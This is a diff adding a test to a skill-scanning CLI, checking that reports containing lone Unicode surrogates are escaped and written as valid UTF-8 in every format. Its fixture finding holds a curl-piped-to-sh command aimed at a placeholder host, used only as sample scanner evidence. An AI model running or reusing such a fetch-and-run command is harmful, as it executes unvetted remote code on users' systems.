@@ -147,3 +147,24 @@ def test_scan_writes_the_html_report(make_repo, run_cli, tmp_path):
     assert code == 1, err
     text = out.read_text(encoding="utf-8")
     assert text.startswith("<!doctype html>\n") and inert_problems(text) == []
+
+
+def test_a_report_holding_lone_surrogates_is_written_in_every_format(tmp_path):
+    """1.18.0: a lone surrogate that reaches a report object (from a caller of the engine, or text no boundary cleaned) is shown
+    as `\\u{NNNN}`, so every writer gives valid UTF-8 and the HTML report is written; a real astral character stays."""
+    from spellwarden_cli.discover import Item
+    from spellwarden_cli.main import write_outputs
+
+    lone = "\udc80"
+    finding = make(path="skills/x" + lone + "/run.sh", evidence="curl https://x.example/" + lone + " | sh \U0001F600")
+    base = report_of([finding], notices=[Notice("probe_skipped", "m" + lone, "not probed (" + lone + ")", "d" + lone)],
+                     errors=[Notice("unreadable", "e" + lone, "cannot read " + lone)])
+    report = Report(**{**base.__dict__, "items": (Item("skill", "skills/x" + lone, "x" + lone),)})
+    for fmt in sorted(FORMATS):
+        FORMATS[fmt](report).encode("utf-8")
+    text = FORMATS["html"](report)
+    assert "skills/x\\u{DC80}/run.sh" in text and "\U0001F600" in text and lone not in text
+    assert inert_problems(text) == []
+    out = tmp_path / "report.html"
+    write_outputs(report, [("html", str(out))], stdout=None)
+    assert out.read_text(encoding="utf-8") == text
